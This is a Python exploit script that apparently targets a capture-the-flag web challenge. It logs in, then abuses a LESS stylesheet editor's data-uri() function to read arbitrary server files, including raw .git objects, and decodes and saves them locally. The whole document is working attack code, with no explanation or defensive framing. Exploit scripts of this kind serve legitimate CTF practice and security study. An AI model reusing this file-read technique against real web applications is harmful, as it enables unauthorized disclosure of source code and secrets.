import zlib
import requests
import time 
import base64

url = "https://pasteweb.ctf.zoolab.org/"
current_time = time.time()


s = requests.session()
payload = {
    'username' : "ccccc",
    'password' : "ccccc",
    'current_time' : current_time
}

login = s.post(url=url,data=payload)

def dump1(file_name):
    less_payload ={
        'less' : "p{ color: data-uri('/var/www/html/%s'); }" % file_name
    }

    s.post(url=url+"editcss.php",data=less_payload)
    view = s.get(url=url+"view.php")
    code = base64.b64decode(view.content.split(b'base64,')[1].split(b'");\n}')[0])
    f = open('git/'+'123',"wb")
    f.write(code)
    f.close()


def dump2(file_name):
    hash_1 = file_name[0:2]
    
    less_payload ={
        'less' : "p{ color: data-uri('/var/www/html/.git/objects/%s/%s'); }" % (hash_1,file_name[2:])
    }

    s.post(url=url+"editcss.php",data=less_payload)
    view = s.get(url=url+"view.php")
    code = base64.b64decode(view.content.split(b'base64,')[1].split(b'");\n}')[0])
    data = zlib.decompress(code)
    f = open('git/'+file_name,"wb")
    f.write(data)
    f.close()

#dump1('sandbox/67c762276bced09ee4df0ed537d164ea/555.php.css')
#dump2('b66e22d6d4a2a5b9b17ca66165485cf2c8cf8025')



